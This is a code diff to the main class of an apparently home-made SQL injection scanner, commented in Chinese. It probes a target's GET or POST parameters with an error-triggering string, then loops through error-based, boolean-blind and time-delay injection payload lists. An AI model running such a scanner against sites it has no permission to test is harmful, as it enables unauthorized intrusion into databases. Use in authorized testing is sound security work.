@@ -53,7 +53,7 @@ public class Main {
             resolvingPost.CollectPost(path);
 
             //构造ReslovingPost对象 对文件中post数据包中的内容进行解析并存储
-            correctInput = new UserInput(resolvingPostFirst,method);
+            correctInput = new UserInput(resolvingPostFirst);
             //构建对象的时候发起的请求
             //设置post body 之后
         }else {
@@ -73,7 +73,6 @@ public class Main {
         //首先探测有无报错信息
         String error = "'<>{}/a1\")(";
 
-
         String testErrorPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(error));
         System.out.println("报错信息探测中------------");
 
@@ -84,11 +83,11 @@ public class Main {
                 String markValue =  resolvingPost1.getMarkValue();
                 String errorPayload = paramOperation.markConnect(markValue, testErrorPayload);
                 resolvingPost1.setHashMap(resolvingPost1.getMarkKey(), errorPayload);
-                testPayloadInput = new UserInput(resolvingPost1,method);
+                testPayloadInput = new UserInput(resolvingPost1);
             }
             else {
                 paramOperation.addRequest(testErrorPayload,resolvingPost1);
-                testPayloadInput =  new UserInput(resolvingPost1,method);
+                testPayloadInput =  new UserInput(resolvingPost1);
             }
         }else {
              String temp = correctInput.getFrontPart();
@@ -96,7 +95,7 @@ public class Main {
         }
 
 
-        int mark1=judge.ErrorJudge(testPayloadInput,0);
+        int mark1=judge.ErrorJudge(testPayloadInput);
 
         if(mark1==1){
             System.out.println(mark1);
@@ -106,12 +105,33 @@ public class Main {
             System.out.println("页面无回显报错信息，不存在报错注入");
         }
 
+        //练习模块 79-108注释
+//        if(correctInput.getMethod().equals("GET")){
+//            ErrorInject inject = new ErrorInject(correctInput);
+//            if(inject.isButtonStatus()){
+//                inject.aInject(correctInput,inject);
+//            }
+//        }else {
+//            ErrorInject inject = new ErrorInject(resolvingPost);
+//            if(inject.isButtonStatus()){
+//            inject.aInject(resolvingPost,correctInput);}
+//        }
 
+
+        //
+
+
+
+
+
+
+
+        //练习模块
 
         System.out.println("进行报错注入");
         for(int i = 0; i< errorPayload.size(); i++){
             UserInput errorPayloadInput =null;
-            String errorPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(ErrorPayload.errorPayload.get(i).toString()));
+            String errorPayload = paramOperation.Connect(1,correctInput,URLEncoder.encode(ErrorPayload.errorPayload.get(i).toString()));
 
             if (correctInput.getMethod().equals("POST")){
                 ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();
@@ -120,11 +140,11 @@ public class Main {
                     String markValue =  resolvingPost1.getMarkValue();
                      errorPayload = paramOperation.markConnect(markValue, ErrorPayload.errorPayload.get(i).toString());
                     resolvingPost1.setHashMap(resolvingPost1.getMarkKey(), errorPayload);
-                    errorPayloadInput = new UserInput(resolvingPost1,method);
+                    errorPayloadInput = new UserInput(resolvingPost1);
                 }
                 else {
-                    paramOperation.addRequest(testErrorPayload,resolvingPost1);
-                    errorPayloadInput =  new UserInput(resolvingPost1,method);
+                    paramOperation.addRequest(errorPayload,resolvingPost1);
+                    errorPayloadInput =  new UserInput(resolvingPost1);
 
 //                    String temp = correctInput.getFrontPart();
 //                    System.out.println();
@@ -135,7 +155,7 @@ public class Main {
                     String temp = correctInput.getFrontPart();
                     errorPayloadInput =new UserInput(temp+errorPayload);
                 }
-                int mark= judge.ErrorJudge(errorPayloadInput,button);
+                int mark= judge.ErrorJudge(errorPayloadInput);
 
                 if(mark==1){
                     System.out.println(mark);
@@ -170,7 +190,7 @@ public class Main {
 //            }
 
 
-        System.out.println("-----进行boolean注入---");
+
 
 
         UserInput falesPayloadInput =null;
@@ -181,7 +201,7 @@ public class Main {
             if(button==1){
                 System.out.println("跳过布尔型注入");
                 break;}
-
+            System.out.println("-----进行boolean注入---");
             //目前拿到了修改后的payload
             String falesPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(BooleanPayload.booleanFalesPayload.get(i).toString()));
             String turePayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(BooleanPayload.booleanTurePayload.get(i).toString()));
@@ -193,8 +213,8 @@ public class Main {
 
                 paramOperation.addRequest(falesPayload,resolvingPost1);
                 paramOperation.addRequest(turePayload,resolvingPost2);
-                falesPayloadInput =  new UserInput(resolvingPost1,method);
-                turePayloadInput =  new UserInput(resolvingPost2,method);}
+                falesPayloadInput =  new UserInput(resolvingPost1);
+                turePayloadInput =  new UserInput(resolvingPost2);}
             else
             {
                 String temp = correctInput.getFrontPart();
@@ -215,11 +235,11 @@ public class Main {
             System.out.println("布尔盲注未发现结果");
 
             System.out.println("开始延时注入");}{
-            System.out.println("开始跑数据");
+            System.out.println("  ");
         }
 
 
-        button=0;
+
         for(int i =0;i< SleepPayload.sleepPayload.size();i++){
             if(button==1){
                 System.out.println("跳过延时注入");
@@ -231,7 +251,7 @@ public class Main {
                 ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();
 
                 paramOperation.addRequest(sleepPayload,resolvingPost1);
-                sleepPayloadInput =  new UserInput(resolvingPost1,method);}
+                sleepPayloadInput =  new UserInput(resolvingPost1);}
             else {
                 String temp = correctInput.getFrontPart();
                 System.out.println();
